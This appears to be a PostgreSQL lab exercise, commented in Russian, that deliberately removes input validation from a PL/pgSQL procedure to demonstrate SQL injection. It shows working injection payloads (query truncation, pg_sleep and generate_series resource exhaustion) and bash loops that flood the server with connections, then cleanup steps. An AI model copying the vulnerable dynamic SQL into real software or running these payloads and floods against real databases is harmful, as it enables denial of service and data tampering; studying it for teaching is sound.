CREATE OR REPLACE PROCEDURE print_sal_v333(
    p_sname text DEFAULT NULL,
    p_city  text DEFAULT NULL,
    p_op    text DEFAULT 'AND'
)
LANGUAGE plpgsql AS $$
DECLARE
    v_where text;
    v_sql   text;
    v_rec   record;
BEGIN
    -- для SQL "AND", "And", "anD" и "and" безразличны,
    -- а вот для сравнения со строками через NOT IN станет необходимость

    /* p_op := upper(p_op);
    IF p_op NOT IN ('AND', 'OR') THEN
        RAISE EXCEPTION 'Оператор должен быть AND или OR, получено: %', p_op;
    END IF; */

    -- убираем свою валидацию: сразу же открываем дыру для обоих видов SQL-инъекций!

    v_where := concat_ws(
        format(' %s ', p_op),
        CASE WHEN p_sname IS NOT NULL THEN format('sname = %L', p_sname) END,
        CASE WHEN p_city  IS NOT NULL THEN format('city  = %L', p_city)  END
    );
    v_sql := format(
        'SELECT snum, sname, city, comm FROM sal %s',
        CASE WHEN v_where <> '' THEN 'WHERE ' || v_where ELSE '' END
    );
    RAISE NOTICE 'SQL: %', v_sql;

    FOR v_rec IN EXECUTE v_sql LOOP
        RAISE NOTICE 'snum=%, sname=%, city=%, comm=%',
            v_rec.snum, v_rec.sname, v_rec.city, v_rec.comm;
    END LOOP;
END;
$$;


CALL print_sal_v333('Peel', 'London');  -- args
CALL print_sal_v333('Peel', 'San Jose');  -- нет такой записи
CALL print_sal_v333(p_city => 'London', p_sname => 'Peel');  -- kwargs
CALL print_sal_v333('Peel', 'San Jose', 'OR');
CALL print_sal_v333('Peel', 'San Jose', 'oR');
CALL print_sal_v333('Peel', 'San Jose', 'xor');  -- сломался EXECUTE, изначально для
                                                 -- этого и была добавлена валидация...


-- Первый вид SQL-инъекций: меняем работу процедуры, но не встраиваем стороннюю логику
CALL print_sal_v333('Peel', 'London', '--');

-- Второй вид SQL-инъекций: не меняет логику работы процедуры, но делаем что-то своё
CALL print_sal_v333('Peel', 'London',
  'AND (WITH evil AS (INSERT INTO sal VALUES (9999, ''HACKED'', ''XXX'', 999)) SELECT count(*) FROM evil) > 0 AND');
-- PostgreSQL применил защиту уже по своему дизайну! Не все СУБД могут похвастаться этим! SQL корректный, но отвалился
-- ERROR:  WITH clause containing a data-modifying statement must be at the top level

CALL print_sal_v333('Peel', 'London', 'AND pg_sleep(10) IS NULL AND');  -- работает, DoS/DDoS удался!
-- Атака больше актуальна через DDoS - много клиентов, забивается пул биндинга, что обслуживает порт
for i in {1..100}; do
    psql -U admin -d labs -c \
        "CALL print_sal_v333('Peel', 'London', 'AND pg_sleep(3600) IS NULL AND');" &
done
while :; do
    psql -U admin -d labs -c \
        "CALL print_sal_v333('Peel', 'London', 'AND pg_sleep(3600) IS NULL AND');" &
    sleep 0.1   # чтобы не положить хост целиком
done

CALL print_sal_v333('Peel', 'London', 'AND (SELECT count(*) FROM generate_series(1, 1e9)) IS NULL AND');
-- Больше заточено под CPU, для пущего эффекта нужен опять DDoS вместо DoS (много клиентов)

CALL print_sal_v333('Peel', 'London', 'AND (SELECT count(*) FROM (SELECT * FROM generate_series(1, 1e8) ORDER BY random()) x) > 0 AND');
-- Добавим к серии из миллиарда серии ещё и сортировку


-- Лечим проблему DDoS с бесконечным циклом:
pkill -f "psql.*print_sal_v333"
-- [1]+  Terminated              psql -U admin -d labs -c "CALL print_sal_v333('Peel', 'London', 'AND pg_sleep(3600) IS NULL AND');"
ps aux | grep psql | wc -l    -- 1   (единицу даёт сам grep: root      9603  0.0  0.0   6520  2176 pts/0    S+   18:20   0:00 grep psql)
ps aux | grep "postgres: admin" | grep -v grep | wc -l    -- 100
-- Что произошло: pkill убил 100 клиентов – 1 из текущего терминала и 99 осиротевших из закрытого
-- Но backend'ы (по одному на каждый клиент) остались живы – они крутили pg_sleep(3600) и не замечали разрыва сокета.
-- psql по-прежнему не мог подключиться – все 100 слотов заняты.

pkill -TERM -f "postgres: admin labs"
ps aux | grep "postgres: admin" | grep -v grep | wc -l    -- 0
psql -U admin -d labs    -- заработало!
-- pkill -TERM (не -9) – корректное завершение backend'ов.
-- Каждый откатил транзакцию, освободил слот, закрыл сокет. После – 0 backend'ов, psql подключается.


\df
DROP PROCEDURE IF EXISTS print_sal_v333(text, text, text);
\df
